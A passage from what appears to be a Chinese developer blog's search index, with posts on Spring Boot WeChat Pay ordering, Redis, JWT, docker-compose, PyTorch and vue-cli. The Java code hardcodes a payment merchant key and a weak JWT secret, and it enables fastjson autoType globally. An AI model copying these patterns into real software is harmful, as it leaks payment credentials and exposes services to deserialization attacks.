@Autowired private BaseOrderListInsert baseOrderListInsert ; @Autowired private BaseOrderListSelect baseOrderListSelect ; @Autowired private BusinessMapper businessMapper ; @Autowired private QRMapper qrMapper ; @Autowired private BOMapper boMapper ; /** * 订单下单 * @param data * @param request * @return * @throws Exception */ @PostMapping("/sendwxpay") public Object RequestWxPayAPI(@RequestBody String data, HttpServletRequest request) throws Exception &#123; /** * Token获取 */ String token = request.getHeader("Authorization"); if (StringUtils.isBlank(token)) &#123; token = request.getParameter("Authorization"); &#125; String jwtJson = JwtUtils.decipheringToken(token) ; Map&lt;String ,Object&gt; jwtdata = JSONObject.parseObject(jwtJson,Map.class) ; EncryptedData encryptedData = JSONObject.parseObject(JSONObject.toJSONString(jwtdata.get("wxdata")),EncryptedData.class) ; String openid = encryptedData.getOpenId() ; /** * 初始化请求数据 */ WxOrderList wxOrderList = JSONObject.parseObject(data,WxOrderList.class) ; /** * 初始化订单ID */ final String olid = IdUtil.Olid() ; /** * 请求微信api接口 */ //String body = JSONObject.toJSONString(baseOrderList) ; String url = "https://api.mch.weixin.qq.com/pay/unifiedorder" ; /** * 请求参数初始化 */ Map&lt;String,String&gt; WxPayParams = new HashMap&lt;&gt;() ; WxPayParams.put("appid" , "wxfd4904504d50f9c2") ; WxPayParams.put("mch_id","1545831661") ; WxPayParams.put("nonce_str", WXPayUtil.generateNonceStr()); WxPayParams.put("body","OBOX小程序订单支付") ; WxPayParams.put("out_trade_no",olid) ; WxPayParams.put("total_fee",String.valueOf(wxOrderList.getSum())); WxPayParams.put("spbill_create_ip","118.31.120.92") ; WxPayParams.put("notify_url","http://118.31.120.92/msg") ; WxPayParams.put("trade_type","JSAPI") ; WxPayParams.put("openid",openid) ; WxPayParams.put("sign",WXPayUtil.generateSignature(WxPayParams,"x5pgk5c1TT8h96R489trD52dokUDPYW7")); String XML = WXPayUtil.mapToXml(WxPayParams) ; String r = new String(XML.getBytes(),"UTF-8"); // 请求数据编码配置 restTemplate.getMessageConverters().set(1,new StringHttpMessageConverter(StandardCharsets.UTF_8)) ; String res = restTemplate.postForObject(url,r,String.class) ; /** * 将获得的内容转化为map类型 */ Map&lt;String,String&gt; reponse = WXPayUtil.xmlToMap(res) ; reponse.put("timeStamp",String.valueOf(new Date().getTime()/1000)) ; reponse.put("signType","MD5") ; Map&lt;String,String&gt; result = new HashMap&lt;&gt;() ; result.put("appId",WxPayParams.get("appid")) ; result.put("nonceStr",reponse.get("nonce_str")) ; result.put("package","prepay_id="+reponse.get("prepay_id")) ; result.put("signType","MD5") ; result.put("timeStamp",String.valueOf(new Date().getTime()/1000)) ; String paysign = WXPayUtil.generateSignature(result,"x5pgk5c1TT8h96R489trD52dokUDPYW7") ; String inner = "" ; for (String key : result.keySet())&#123; inner += key + "=" + result.get(key)+"&amp;" ; &#125; inner = inner.substring(0,inner.length()-1) ; inner = "MD5(" + inner + ")" + "=" + paysign ; result.put("paySign",paysign) ; result.remove("appId") ; result.remove("key") ; /** * 插入订单信息 */ List&lt;BaseOrderList&gt; baseOrderLists = new ArrayList&lt;&gt;() ; /** * 循环遍历 */ for (WxOrderGoodsInfo wxOrderGoodsInfo : wxOrderList.getGoods()) &#123; /** * 初始化订单信息 */ BaseOrderList baseOrderList = new BaseOrderList(); baseOrderList.setOlid(olid); baseOrderList.setOltype("notpaid"); baseOrderList.setUid(qrMapper.SelectUidByOpendi(openid)); baseOrderList.setOlgid(wxOrderGoodsInfo.getGid()); baseOrderList.setOlgnum(wxOrderGoodsInfo.getGnum()); baseOrderList.setOlprice(wxOrderGoodsInfo.getGsum()); baseOrderList.setOlremark(wxOrderGoodsInfo.getRemarks()); baseOrderList.setOluphone(wxOrderList.getUphone()); Calendar calendar = Calendar.getInstance(); Date date = calendar.getTime(); SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss"); String s = sdf.format(date); baseOrderList.setOldate(s); // 插入 baseOrderLists.add(baseOrderList); /** * 插入订单 */ baseOrderListInsert.InsertBaseOrderList(baseOrderList); &#125; Map&lt;String,Object&gt; resdata = new HashMap&lt;&gt;() ; resdata.put("reponse",result) ; resdata.put("olid",olid) ; return resdata ; &#125; /** * 确认订单 * @param data 扫码后获得的qrid * @return */ @PostMapping("checkwxpay") public Object CheckPay(@RequestBody String data)&#123; /** * 初始化订单信息 */ List&lt;BaseOrderList&gt; baseOrderLists = baseOrderListSelect.SelectBaseOrderList(data); /** * 更新订单信息 */ baseOrderListInsert.UpdateBaseOrderList(data) ; /** * 二维码 */ List&lt;CheckSales&gt; checkSales = new ArrayList&lt;&gt;() ; /** * 循环遍历 */ for (BaseOrderList b : baseOrderLists) &#123; /** * 初始化订单信息 */ BaseOrderList baseOrderList = b ; /** * 插入BO信息 */ BO bo = new BO(); bo.setOlid(baseOrderList.getOlid()); bo.setGid(baseOrderList.getOlgid()); bo.setGnum(baseOrderList.getOlgnum()); bo.setGprice(baseOrderList.getOlprice()); bo.setGtime(baseOrderList.getOldate()); bo.setBid(businessMapper.SelectBidByGid(baseOrderList.getOlgid())); bo.setUid(baseOrderList.getUid()); // 插入 boMapper.InsertBO(bo) ; /** * 二维码生成 */ for (int i = 0 ;i &lt;bo.getGnum() ; i++)&#123; CheckSales cs = new CheckSales() ; cs.setGid(bo.getGid()); cs.setOlid(bo.getOlid()); cs.setQrid(IdUtil.Qrid()); cs.setStatus("0"); cs.setUid(baseOrderList.getUid()); cs.setQrhref(QRService.GenerateQR(cs.getQrid())); checkSales.add(cs) ; //插入 qrMapper.InsertQR(cs) ; &#125; &#125; return checkSales ; &#125;&#125; 订单二维码生成器12345678910111213141516171819202122232425262728package com.obox.obox.service.QR;import com.alibaba.fastjson.JSON;/** * * 二维码生成服务 */public class QRService &#123; private static String URL = "http://qr.liantu.com/api.php?text=" ; /** * 二维码图片链接 * @param id * @return */ public static String GenerateQR(String id)&#123; String OR_Code_Url = URL + id ; return OR_Code_Url ; &#125;&#125;]]></content>
  </entry>
  <entry>
    <title><![CDATA[SpringBoot整合redis]]></title>
    <url>%2F2019%2F08%2F07%2Fspringboot%E6%95%B4%E5%90%88redis%2F</url>
    <content type="text"><![CDATA[项目中整合redis配置 springboot整合redis缓存maven依赖1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;&lt;/dependency&gt; redis序列换用fastjson 设置fastjson序列化 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657package com.obox.obox.configuration;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.parser.ParserConfig;import com.alibaba.fastjson.serializer.SerializerFeature;import com.fasterxml.jackson.databind.JavaType;import com.fasterxml.jackson.databind.ObjectMapper;import com.fasterxml.jackson.databind.type.TypeFactory;import org.springframework.data.redis.serializer.RedisSerializer;import org.springframework.data.redis.serializer.SerializationException;import org.springframework.util.Assert;import java.nio.charset.Charset;public class FastJsonRedisSerializer&lt;T&gt; implements RedisSerializer &#123; public static final Charset DEFAULT_CHARSET = Charset.forName("UTF-8"); private ObjectMapper objectMapper = new ObjectMapper(); private Class&lt;T&gt; c ; static &#123; ParserConfig.getGlobalInstance().setAutoTypeSupport(true); &#125; public FastJsonRedisSerializer(Class&lt;T&gt; c)&#123; super(); this.c = c ; &#125; @Override public byte[] serialize(Object o) throws SerializationException &#123; return JSON.toJSONString(o, SerializerFeature.WriteClassName).getBytes(); &#125; @Override public Object deserialize(byte[] bytes) throws SerializationException &#123; if (bytes == null || bytes.length&lt;=0)&#123; return null ; &#125; String str = new String(bytes,DEFAULT_CHARSET); return (T)JSON.parseObject(str,c) ; &#125; public void setObjectMapper(ObjectMapper objectMapper) &#123; Assert.notNull(objectMapper, "'objectMapper' must not be null"); this.objectMapper = objectMapper; &#125; protected JavaType getJavaType(Class&lt;?&gt; clazz) &#123; return TypeFactory.defaultInstance().constructType(clazz); &#125;&#125; redis中注册配置fatsjosn序列化工具 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869package com.obox.obox.configuration;import com.fasterxml.jackson.annotation.JsonAutoDetect;import com.fasterxml.jackson.annotation.PropertyAccessor;import com.fasterxml.jackson.databind.ObjectMapper;import org.springframework.cache.CacheManager;import org.springframework.cache.annotation.CachingConfigurationSelector;import org.springframework.cache.annotation.CachingConfigurerSupport;import org.springframework.cache.annotation.EnableCaching;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import org.springframework.data.redis.RedisConnectionFailureException;import org.springframework.data.redis.cache.RedisCacheConfiguration;import org.springframework.data.redis.cache.RedisCacheManager;import org.springframework.data.redis.connection.RedisConnectionFactory;import org.springframework.data.redis.core.RedisTemplate;import org.springframework.data.redis.serializer.RedisSerializer;import org.springframework.data.redis.serializer.StringRedisSerializer;import java.time.Duration;import java.util.HashMap;import java.util.HashSet;import java.util.Map;import java.util.Set;@Configuration@EnableCachingpublic class RedisConfig extends CachingConfigurerSupport &#123; /*@Bean(name="redisTemplate") public RedisTemplate&lt;String,Object&gt; redisTemplate(RedisConnectionFactory factory)&#123; RedisTemplate&lt;String,Object&gt; template = new RedisTemplate&lt;&gt;() ; // 配置连接工厂 template.setConnectionFactory(factory); FastJsonRedisSerializer serializer = new FastJsonRedisSerializer(Object.class); ObjectMapper mapper = new ObjectMapper() ; mapper.setVisibility(PropertyAccessor.ALL, JsonAutoDetect.Visibility.ANY) ; mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL); serializer.setObjectMapper(mapper); template.setValueSerializer(serializer); template.setKeySerializer(new StringRedisSerializer()); template.afterPropertiesSet(); return template ; &#125;*/ @Bean public RedisSerializer fastJson2JsonRedisSerializer() &#123; return new FastJsonRedisSerializer(Object.class); &#125; @Bean public RedisTemplate initRedisTemplate(RedisConnectionFactory redisConnectionFactory, RedisSerializer fastJson2JsonRedisSerializer) throws Exception &#123; RedisTemplate redisTemplate = new RedisTemplate(); redisTemplate.setConnectionFactory(redisConnectionFactory); redisTemplate.setValueSerializer(fastJson2JsonRedisSerializer); redisTemplate.setKeySerializer(new StringRedisSerializer()); redisTemplate.afterPropertiesSet(); return redisTemplate; &#125; &#125; redis工具类123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114package com.obox.obox.Utils;import com.fasterxml.jackson.databind.ObjectMapper;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.ComponentScan;import org.springframework.data.redis.core.RedisTemplate;import org.springframework.stereotype.Component;@Componentpublic class RedisUtil &#123; @Autowired private RedisTemplate&lt;String,Object&gt; redisTemplate ; public RedisUtil(RedisTemplate&lt;String,Object&gt; redis)&#123; redisTemplate = redis ; &#125; /** * 是否存在key值 * @param key * @return */ public boolean HasKey(String key)&#123; if (redisTemplate.hasKey(key))&#123; return true ; &#125;else &#123; return false ; &#125; &#125; /** * * 添加缓存 * @param key * @param value * @return */ public boolean AddItem(String key ,Object value)&#123; if (value == null)&#123; return false ; &#125;else &#123; redisTemplate.opsForValue().set(key,value); return true ; &#125; &#125; /** * * 删除缓存 * @param key * @return */ public boolean DelItem(String key)&#123; if (redisTemplate.hasKey(key))&#123; redisTemplate.delete(key) ; return true ; &#125;else &#123; return false ; &#125; &#125; /** * * 更新缓存 * @param key * @param value * @return */ public boolean UpdateItem(String key,Object value)&#123; if (this.DelItem(key) &amp;&amp; this.AddItem(key,value) )&#123; return true ; &#125;else &#123; return false ; &#125; &#125; /** * * 获取缓存 * @param key * @return */ public Object GetItem (String key)&#123; if (this.HasKey(key))&#123; return redisTemplate.opsForValue().get(key) ; &#125;else &#123; return null ; &#125; &#125;&#125;]]></content>
  </entry>
  <entry>
    <title><![CDATA[SpringBoot整合jwt]]></title>
    <url>%2F2019%2F08%2F07%2FSpringboot%E6%95%B4%E5%90%88JWT%2F</url>
    <content type="text"><![CDATA[在商业项目中，后端并非只完成http接口就可以，更要对安全问题进行验证，主流springsecurity,shiro,jwt 整合步骤maven依赖12345&lt;dependency&gt; &lt;groupId&gt;io.jsonwebtoken&lt;/groupId&gt; &lt;artifactId&gt;jjwt&lt;/artifactId&gt; &lt;version&gt;0.9.0&lt;/version&gt;&lt;/dependency&gt; 配置拦截器123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112package com.obox.obox.model.token;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import com.obox.obox.Utils.JwtUtils;import io.jsonwebtoken.Claims;import org.apache.commons.lang3.StringUtils;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.stereotype.Component;import org.springframework.web.method.HandlerMethod;import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;import java.lang.reflect.Method;@Componentpublic class JwtInterceptor extends HandlerInterceptorAdapter &#123; public static final String USER_KEY = "oboxusrid"; @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123; String servletPath = request.getServletPath(); System.out.println("ServletPath: " + servletPath); // 如果不是映射到方法直接通过 if (!(handler instanceof HandlerMethod)) &#123; return true; &#125; HandlerMethod handlerMethod = (HandlerMethod) handler; Method method = handlerMethod.getMethod() ; // 检查是否有passtoken注释，有则跳过认证 if (method.isAnnotationPresent(NoToken.class)) &#123; NoToken passToken = method.getAnnotation(NoToken.class); if (passToken.required()) &#123; return true; &#125; &#125; // 需要验证 String token = getToken(request); if (StringUtils.isBlank(token)) &#123; throw new Exception("失效,请重新登录"); &#125; // 获取签名信息 Claims claims = JwtUtils.checkToken(token); System.out.println("TOKEN: " + claims); // 判断签名是否存在或过期 boolean b = claims == null || claims.isEmpty() || JwtUtils.checkToken(token) == null; if (b) &#123; throw new Exception("失效,请重新登录"); &#125; // 将签名中获取的用户信息放入request中; request.setAttribute(USER_KEY, claims.getSubject()); return true; &#125; /** * 获取请求Token */ private String getToken(HttpServletRequest request) &#123; String token = request.getHeader("Authorization"); if (StringUtils.isBlank(token)) &#123; token = request.getParameter("Authorization"); &#125; return token; &#125; /** * 不用拦截的页面路径(也可存入数据库中), 不要以 / 结尾 */ private static final String[] NOT_CHECK_URL = &#123;"/test/**", "/login/**"&#125;; /** * 根据URL判断当前请求是否不需要校验, true:需要校验 */ public boolean isNotCheck(String servletPath) &#123; // 若 请求接口 以 / 结尾, 则去掉 / servletPath = servletPath.endsWith("/") ? servletPath.substring(0,servletPath.lastIndexOf("/")) : servletPath; System.out.println("servletPath = " + servletPath); for (String path : NOT_CHECK_URL) &#123; System.out.println("path = " + path); // path 以 /** 结尾, servletPath 以 path 前缀开头 if (path.endsWith("/**")) &#123; String pathStart = path.substring(0, path.lastIndexOf("/")+1); System.out.println("pathStart = " + pathStart); if (servletPath.startsWith(pathStart)) &#123; return true; &#125; String pathStart2 = path.substring(0, path.lastIndexOf("/")); System.out.println("pathStart2 = " + pathStart2); if (servletPath.equals(pathStart2)) &#123; return true; &#125; &#125; // servletPath == path if (servletPath.equals(path)) &#123; return true; &#125; &#125; return false; &#125;&#125; 设置无需验证注解123456789101112131415package com.obox.obox.model.token;import java.lang.annotation.ElementType;import java.lang.annotation.Retention;import java.lang.annotation.RetentionPolicy;import java.lang.annotation.Target;/** * 无需token验证注解 */@Target(&#123; ElementType.METHOD, ElementType.TYPE &#125;)@Retention(RetentionPolicy.RUNTIME)public @interface NoToken &#123; boolean required() default true;&#125; 设置拦截器生效1234567891011121314151617181920212223242526package com.obox.obox.configuration;import com.obox.obox.model.token.JwtInterceptor;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.context.annotation.Configuration;import org.springframework.http.converter.HttpMessageConverter;import org.springframework.web.servlet.config.annotation.InterceptorRegistry;import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;import org.springframework.web.servlet.config.annotation.WebMvcConfigurerAdapter;@Configurationpublic class WebConfig implements WebMvcConfigurer &#123; @Autowired private JwtInterceptor jwtInterceptor; /** * APP接口拦截器 */ @Override public void addInterceptors(InterceptorRegistry registry) &#123; registry.addInterceptor(jwtInterceptor).addPathPatterns("/**"); &#125;&#125; 设置JWTUtil12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576package com.obox.obox.Utils;import io.jsonwebtoken.Claims;import io.jsonwebtoken.Jwts;import io.jsonwebtoken.SignatureAlgorithm;import java.util.Date;/** * jwt 工具类 * */public class JwtUtils &#123; public static String SUBJECT = "oboxweb" ; public static final long EXPIRE = 1000*60*60 ; public static final String APPSECRET = "oboxsecret" ; /** * Token 生成 * @param info * @return */ public static String geneJsonWebToken(String info)&#123; if (info != null) &#123; String token = Jwts.builder().setSubject(SUBJECT) .claim("info", info) // 加密信息 .setIssuedAt(new Date()) // 发行时间 .setExpiration(new Date(System.currentTimeMillis() + EXPIRE)) // 过期时间 .signWith(SignatureAlgorithm.HS256, APPSECRET).compact(); // 设置加密算法和加密串 return token ; &#125;else &#123; return null ; &#125; &#125; /** * token 校验 * @param token * @return */ public static Claims checkToken(String token)&#123; try &#123; final Claims claims = Jwts.parser().setSigningKey(APPSECRET).parseClaimsJws(token).getBody() ; return claims ; &#125;catch (Exception e)&#123; return null ; &#125; &#125; /** * token 解密 * @return */ public static String decipheringToken(String token)&#123; try &#123; final Claims claims = Jwts.parser().setSigningKey(APPSECRET).parseClaimsJws(token).getBody() ; return (String) claims.get("info") ; &#125;catch (Exception e)&#123; return null ; &#125; &#125;&#125;]]></content>
  </entry>
  <entry>
    <title><![CDATA[docker-compose.yml]]></title>
    <url>%2F2019%2F05%2F19%2Fdocker-compose%2F</url>
    <content type="text"><![CDATA[一些docker-compose-yml文件 Nexcus12345678910version: '3'services: nexus: restart: always image: sonatype/nexus3 container_name: nexus ports: - 8081:8081 volumes: - /usr/local/docker/nexus/data:/nexus-data gitlab123456789101112131415161718192021version: '3'services: web: image: 'gitlab/gitlab-ce' restart: always hostname: '120.79.234.127' environment: TZ: 'Asia/Shanghai' GITLAB_OMNIBUS_CONFIG: | external_url 'http://120.79.234.127:8080' gitlab_rails['gitlab_shell_ssh_port'] = 2222 unicorn['port'] = 8888 nginx['listen_port'] = 8080 ports: - '8080:8080' - '8443:443' - '2222:22' volumes: - /root/user/local/docker/gitlab/config:/etc/gitlab - /root/user/local/docker/gitlab/data:/var/opt/gitlab - /root/user/local/docker/gitlab/logs:/var/log/gitlab]]></content>
  </entry>
  <entry>
    <title><![CDATA[服务器压力测试]]></title>
    <url>%2F2019%2F05%2F16%2F%E6%9C%8D%E5%8A%A1%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[对的就是这个，这个就是打开的教程 1. 进入IHT官方博客网站https://www.uscihtoj.com/ 2. 打开OJ网址 3. 注册 只能用电脑，手机大多数是找不到这个的注册之后就直接Login 登陆就行了 4. 点进测试 密码是: ihttest学长学姐直接进去随便找一段代码放进去，疯狂提交就是了持续时间很短，大概疯狂提交2min左右灰常感谢学长学姐的帮忙，很抱歉占用学长学姐的时间哈]]></content>
  </entry>
  <entry>
    <title><![CDATA[Cesium构建项目]]></title>
    <url>%2F2019%2F05%2F14%2FCesium%2F</url>
    <content type="text"><![CDATA[官方链接!()[https://cesium.com/docs/tutorials/getting-started/#your-first-app] 第一个程序 在Apps目录先创建文件 helloWorld.html 模板文件123456789101112131415&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;script src="https://cesiumjs.org/releases/1.57/Build/Cesium/Cesium.js"&gt;&lt;/script&gt; &lt;link href="https://cesiumjs.org/releases/1.57/Build/Cesium/Widgets/widgets.css" rel="stylesheet"&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="cesiumContainer" style="width: 700px; height:400px"&gt;&lt;/div&gt; &lt;script&gt; Cesium.Ion.defaultAccessToken = 'your_access_token'; var viewer = new Cesium.Viewer('cesiumContainer'); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
  </entry>
  <entry>
    <title><![CDATA[数据加载和预处理]]></title>
    <url>%2F2019%2F04%2F29%2Fpytorch-02-%E6%95%B0%E6%8D%AE%E7%9A%84%E5%8A%A0%E8%BD%BD%E5%92%8C%E9%A2%84%E5%A4%84%E7%90%86%2F</url>
    <content type="text"><![CDATA[pytorm中文手册pytormAPIpytorch官网pytorchCDN加速中文手册 import packagesPyTorch通过torch.utils.data对一般常用的数据加载进行了封装，可以很容易地实现多线程数据预读和批量加载。 并且torchvision已经预先实现了常用图像数据集，包括前面使用过的CIFAR-10，ImageNet、COCO、MNIST、LSUN等数据集，可通过torchvision.datasets方便的调用123import torchfrom torch.utils.data import Datasetimport pandas as pd DatasetDataset是一个抽象类, 为了能够方便的读取，需要将要使用的数据包装为Dataset类。 自定义的Dataset需要继承它并且实现两个成员方法： getitem() 该方法定义用索引(0 到 len(self))获取一条数据或一个样本len() 该方法返回数据集的总长度 代码1234567891011121314151617181920212223#定义一个数据集class BulldozerDataset(Dataset): """ 数据集演示 """ def __init__(self, csv_file): """实现初始化方法，在初始化的时候将数据读载入""" self.df=pd.read_csv(csv_file) def __len__(self): ''' 返回df的长度 ''' return len(self.df) def __getitem__(self, idx): ''' 根据 idx 返回一行数据 ''' return self.df.iloc[idx].SalePrice # 至此，我们的数据集已经定义完成了，我们可以实例话一个对象访问他 ds_demo= BulldozerDataset('median_benchmark.csv') # 实现了 __len__ 方法所以可以直接使用len获取数据总数 len(ds_demo) # 用索引可以直接访问对应的数据, 对应 __getitem__ 方法 ds_demo[0] 数据装载器DataLoader为我们提供了对Dataset的读取操作，常用参数有：batch_size(每个batch的大小), shuffle(是否进行shuffle操作), num_workers(加载数据的时候使用几个子进程)，下面做一个简单的操作12345dl = torch.utils.data.DataLoader(ds_demo, batch_size=10, shuffle=True, num_workers=0)# DataLoader返回的是一个可迭代对象，我们可以使用迭代器分次获取数据idata=iter(dl)print(next(idata)) torchvisiontorchvision 是PyTorch中专门用来处理图像的库torchvision.datasetstorchvision.datasets 可以理解为PyTorch团队自定义的dataset，这些dataset帮我们提前处理好了很多的图片数据集，我们拿来就可以直接使用： · MNIST· COCO· Captions· Detection· LSUN· ImageFolder· Imagenet-12· CIFAR· STL10· SVHN· PhotoTour 我们可以直接使用，示例如下：12345import torchvision.datasets as datasetstrainset = datasets.MNIST(root='./data', # 表示 MNIST 数据的加载的目录 train=True, # 表示是否加载数据库的训练集，false的时候加载测试集 download=True, # 表示是否自动下载 MNIST 数据集 transform=None) # 表示是否需要对数据进行预处理，none为不进行预处理 torchvision.modelstorchvision不仅提供了常用图片数据集，还提供了训练好的模型，可以加载之后，直接使用，或者在进行迁移学习 torchvision.models模块的 子模块中包含以下模型结构。 · AlexNet· VGG· ResNet· SqueezeNet· DenseNet123#我们直接可以使用训练好的模型，当然这个与datasets相同，都是需要从服务器下载的import torchvision.models as modelsresnet18 = models.resnet18(pretrained=True) torchvision.transformsransforms 模块提供了一般的图像转换操作类，用作数据处理和数据增强 12345678from torchvision import transforms as transformstransform = transforms.Compose([ transforms.RandomCrop(32, padding=4), #先四周填充0，在把图像随机裁剪成32*32 transforms.RandomHorizontalFlip(), #图像一半的概率翻转，一半的概率不翻转 transforms.RandomRotation((-45,45)), #随机旋转 transforms.ToTensor(), transforms.Normalize((0.4914, 0.4822, 0.4465), (0.229, 0.224, 0.225)), #R,G,B每层的归一化用到的均值和方差])]]></content>
  </entry>
  <entry>
    <title><![CDATA[神经网络包nn和优化器optm]]></title>
    <url>%2F2019%2F04%2F29%2Fpytorch-01-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%8C%85nn%E5%92%8C%E4%BC%98%E5%8C%96%E5%99%A8optm%2F</url>
    <content type="text"><![CDATA[pytorm中文手册pytormAPIpytorch官网pytorchCDN加速中文手册 相关包引入123import torchimport torch.nn as nnimport torch.nn.functional as F torch.nn是专门为神经网络设计的模块化接口,n构建于 Autograd之上，可用来定义和运行神经网络。 nn.functional，这个包中包含了神经网络中使用的一些常用函数，这些函数的特点是，不具有可学习的参数(如ReLU，pool，DropOut等)，这些函数可以放在构造函数中，也可以不放，但是这里建议不放 定义一个神经网络12345678910111213141516171819202122232425262728293031323334import torchimport torch.nn as nnimport torch.nn.functional as F# 定义一个网络class Net(nn.Module): def __init__(self): super(Net, self).__init__() # 卷积层 '1'表示输入图片为单通道, '6'表示输出通道数，'3'表示卷积核为3*3 self.conv1 = nn.Conv2d(1,6,3) # 线性层，输入1350个特征，输出10个特征 self.fc1 = nn.Linear(1350,10) def forward(self, x): print(x.size()) # 结果：[1, 1, 32, 32] # 卷积 -&gt; 激活 -&gt; 池化 # 卷积的尺寸计算公式后续?? x = F.relu(x) print(x.size()) # 结果：[1, 6, 30, 30] x = F.max_pool2d(x,(2,2)) x = F.relu(x) print(x.size()) # 结果：[1, 6, 15, 15] x = x.view(x.size()[0],-1) # reshape，‘-1’表示自适应 #这里做的就是压扁的操作 就是把后面的[1, 6, 15, 15]压扁，变为 [1, 1350] print(x.size()) x = self.fcl(x) return x ;net = Net()print(net) 结果如下 Net( (conv1): Conv2d(1, 6, kernel_size=(3, 3), stride=(1, 1)) (fc1): Linear(in_features=1350, out_features=10, bias=True)) 返回学习参数12for parameter in net.parameters(): print(parameter) 返回可学习的参数及名称12for name,parameters in net.named_parameters(): print(name,':',parameters.size()) 反向传播 在反向传播前，先要将所有参数的梯度清零 torch.nn只支持mini-batches，不支持一次只输入一个样本，即一次必须是一个batch。12net.zero_grad() out.backward(torch.ones(1,10)) 损失函数12345y = torch.arange(0,10).view(1,10).float()criterion = nn.MSELoss()loss = criterion(out, y)#loss是个scalar，我们可以直接用item获取到他的python类型的数值print(loss.item()) 优化器在反向传播计算完所有参数的梯度后，还需要使用优化方法来更新网络的权重和参数，例如随机梯度下降法(SGD)的更新策略如下： weight = weight - learning_rate * gradient 在torch.optim中实现大多数的优化方法，例如RMSProp、Adam、SGD等，下面我们使用SGD做个简单的样例 导optim包 &amp;&amp; 代码1234567891011121314import torch.optimout = net(input) # 这里调用的时候会打印出我们在forword函数中打印的x的大小criterion = nn.MSELoss()loss = criterion(out, y)#新建一个优化器，SGD只需要要调整的参数和学习率optimizer = torch.optim.SGD(net.parameters(), lr = 0.01)# 先梯度清零(与net.zero_grad()效果一样)optimizer.zero_grad() loss.backward()#更新参数optimizer.step()]]></content>
  </entry>
  <entry>
    <title><![CDATA[Pytorch]]></title>
    <url>%2F2019%2F04%2F19%2Ftest%2F</url>
    <content type="text"><![CDATA[https://github.com/Runindark/Pytorch/blob/master/chapter2/2.1.1.pytorch-basics-tensor.ipynb]]></content>
  </entry>
  <entry>
    <title><![CDATA[Linux命令]]></title>
    <url>%2F2019%2F04%2F18%2Flinux-order%2F</url>
    <content type="text"><![CDATA[根据端口杀死进程1sudo fuser -k -n tcp 80]]></content>
  </entry>
  <entry>
    <title><![CDATA[vue-cli]]></title>
    <url>%2F2019%2F04%2F09%2Fvue-cli%2F</url>
    <content type="text"><![CDATA[vue-cli 安装 安装node.js过程略 使用1node -v 可以查看 安装cnpm利用淘宝加速镜像1npm install -g cnpm –registry=http://registry.npm.taobao.org 安装vue-cli手脚架1npm install -g vue-cli 初始化vue-cli项目利用 webpack 打包1vue init webpack myvue 根据提示完成代码运行12cd myvue``` cnpm install12 cnpm run dev`]]></content>
  </entry>
  <entry>
    <title><![CDATA[资源整合]]></title>
    <url>%2F2019%2F03%2F27%2F%E8%B5%84%E6%BA%90%E6%95%B4%E5%90%88%2F</url>
    <content type="text"><![CDATA[有些很好的帖子或者很好的技术文章都在这里了。 设计模式网址 https://wizardforcel.gitbooks.io/design-pattern-lessons/content/ 学习路线图库移动端 企业级技能 后端学习 https://www.cnblogs.com/huaxingtianxia/p/5724093.html 前端学习 https://github.com/LiangJunrong/document-library/blob/master/other-library/shortArticle/share/November2018.md 游戏(彩蛋) 影狼 https://pan.baidu.com/s/1Mp3b9-D9AJc_0yEbvKV5nA提取码: jzji hacker学习 https://www.ichunqiu.com/ 《网络黑白》《反欺骗的艺术》 梯子 https://repw.github.io/2019/01/20/ssr%E6%90%AD%E5%BB%BA-%E7%A7%91%E5%AD%A6%E7%BF%BB%E5%A2%99/ https://repw.github.io/2019/01/20/ssr搭建-科学翻墙/ 北大学习资料 https://github.com/lib-pku/libpku]]></content>
  </entry>
  <entry>
    <title><![CDATA[ECS踩坑系列之安装nginx]]></title>
    <url>%2F2019%2F03%2F26%2FECS%E9%85%8D%E7%BD%AEnginx%2F</url>
